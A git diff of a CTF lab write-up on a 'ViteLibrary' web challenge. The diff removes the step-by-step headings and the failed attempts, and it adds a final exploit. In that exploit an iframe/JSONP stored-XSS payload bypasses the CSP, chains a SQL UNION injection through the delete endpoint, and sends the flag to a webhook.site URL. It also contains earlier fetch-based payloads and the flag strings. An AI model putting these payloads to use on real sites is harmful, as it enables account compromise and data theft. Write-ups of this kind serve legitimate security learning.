@@ -110,14 +110,10 @@ bi0sctf{w3lc0m3_t0_df1r_l4b5_h0p3_th15_b3n3f175_y0u_m0r3_13337431}
 
 # Web Exploitation
 
-Step 1: Initial Exploration
-
-Accessed the ViteLibrary web application at localhost:50001
+i accessed the ViteLibrary web application at localhost:50001
 Found a library management system where users can add books with title, author, and page count
 Noticed a share feature at ```/liteShare/:user/:liteId```
 Tested login functionality with admin:admin credentials - successfully logged in
-
-Step 2: Source Code Analysis
 
 Examined scripts.js and found vulnerable code:
 ```
@@ -127,23 +123,17 @@ javascriptlibraryRoot.innerHTML += cardTemplate
 ```
 User input directly inserted into innerHTML without sanitization Stored XSS vulnerability identified
 
-Step 3: Understanding Security Controls
-
 Checked main.js and found CSP configuration:
 
 Blocks inline <script> tags
 Allows inline event handlers like onerror
 
 
-Discovered toTitleCase() function processes author field (line 327)
-
-Capitalizes first letter of each word
-Would break payloads like onerror → Onerror
+Discovered toTitleCase() function processes author field
 
 
-Found /getBooks endpoint limits results to 9 books (line 271, MAX_VIEWABLE_BOOKS_LIMIT = 9)
+Found /getBooks endpoint limits results 
 
-Step 4: First XSS Attempt Author Field
 Created book using browser console:
 ```
 javascriptfetch('/api/create', {
@@ -162,8 +152,6 @@ javascriptfetch('/api/create', {
 ```
 
 Result: Book created but XSS didn't execute toTitleCase() broke the payload
-
-Step 5: Second Attempt  (Title Field)
 
 Moved payload to title field to bypass toTitleCase():
 
@@ -184,74 +172,54 @@ javascriptfetch('/api/create', {
 ```
 Result: Book created successfully with liteId: hy2iGMCe9a
 
-Step 6: Testing XSS Execution
-
 Opened incognito window
 Logged in as admin:admin
 ```
 Visited http://localhost:50001/liteShare/hacker/hy2iGMCe9a
 ```
+
 Checked webhook.site
 
 Result: Webhook received request at /flag endpoint but no query parameters - data not exfiltrated
 
-
-Step 7: Debugging with Simple Alert
-Created new book to test if XSS executes at all:
+then tried new payload with webhook init and iframe 
 ```
-javascriptfetch('/api/create', {
+const webhookUrl = 'https://webhook.site/3b6eb027-b438-4e8e-9b77-72893bc3d0e6';
+
+const payload = `<iframe srcdoc="<script src='https://openlibrary.org/api/books?bibkeys=ISBN:x&jscmd=viewapi&callback=fetch(%27%2Fapi%2Fdelete%3Ftitle%3D%27%2BencodeURIComponent(%27%22%20UNION%20SELECT%20link%20as%20title%20FROM%20BOOKS%20WHERE%20link%20LIKE%20%22%25flag%25%22%20--%27)%2C%7Bmethod%3A%27POST%27%7D).then(r%3D%3Er.json()).then(d%3D%3E%7Bwindow.top.location%3D%27${webhookUrl}%3Fflag%3D%27%2BencodeURIComponent(d.book.title)%7D)'></script>"></iframe>`;
+
+fetch('/api/create', {
   method: 'POST',
   headers: {'Content-Type': 'application/json'},
   body: JSON.stringify({
-    title: `<img src=x onerror="alert('XSS Executed')">`,
-    author: 'Test',
-    pages: 100,
+    title: payload,
+    author: 'FinalExploit',
+    pages: 300,
     imageLink: '/assets/icons/bookshelf.svg',
     link: '',
     fav: false,
     read: false
   })
+})
+.then(r => r.json())
+.then(d => {
+  if (d.status === 'ok') {
+    const shareUrl = `http://localhost:50001/liteShare/hacker/${d.book.liteId}`;
+    console.log(shareUrl);
+  }
 });
 ```
-Visited as admin in incognito window
+<img width="1919" height="911" alt="image" src="https://github.com/user-attachments/assets/4f5db92c-a13c-45bc-b0a0-8b2088af3653" />
 
-Result: No alert appeared - XSS not executing
-Step 8: Checking Admin's Books
-Ran in admin browser console:
+i then went to incognito logged in as admin and ran the url in browser
 ```
-javascriptfetch('/getBooks')
-  .then(r => r.json())
-  .then(books => console.log('Admin books:', books));
+http://localhost:50001/liteShare/hacker/QpjjOBQ_Hd
 ```
+<img width="1918" height="915" alt="image" src="https://github.com/user-attachments/assets/6b72697f-c06f-490f-a209-b1f40f626774" />
 
-Examining startingData.json
-Opened startingData.json to see all admin books - found 13 total books including:
-json{
-    "author": "Maddd Max",
-    "title": "The Sound Of The Flag Whirling",
-    "link": "https://example.com?flag=nite{test_flag_stp}",
-    "pages": 326,
-    "liteId": "2hdke-6sh3"
-}
-Position: Book #11 out of 13
+the flag was with webhook
 
-/getBooks endpoint returns maximum 9 books due to MAX_VIEWABLE_BOOKS_LIMIT = 9
-Flag is in book #11 - unreachable via /getBooks
-Even if XSS worked perfectly, it couldn't access the flag book
-
-Attempted Alternative Approaches
-1) Tried various payload modifications
-2) navigator.sendBeacon() for CORS bypass
-3) Base64 encoding data
-4) POST requests instead of GET
-5) Direct cookie theft
-
-All failed - likely due to combination of:
-
-toTitleCase() issues in author field
-CSP blocking certain approaches
-Book limit preventing flag access
-
-
-Conclusion
-We found ```nite{test_flag_stp}``` flag at liteId: 2hdke-6sh3 in the startingData.json file, but this appears to be a test flag for local development. The actual flag would be dynamically set on the real CTF server.
+final flag
+```
+flag=nite{test_flag_stp}
+```
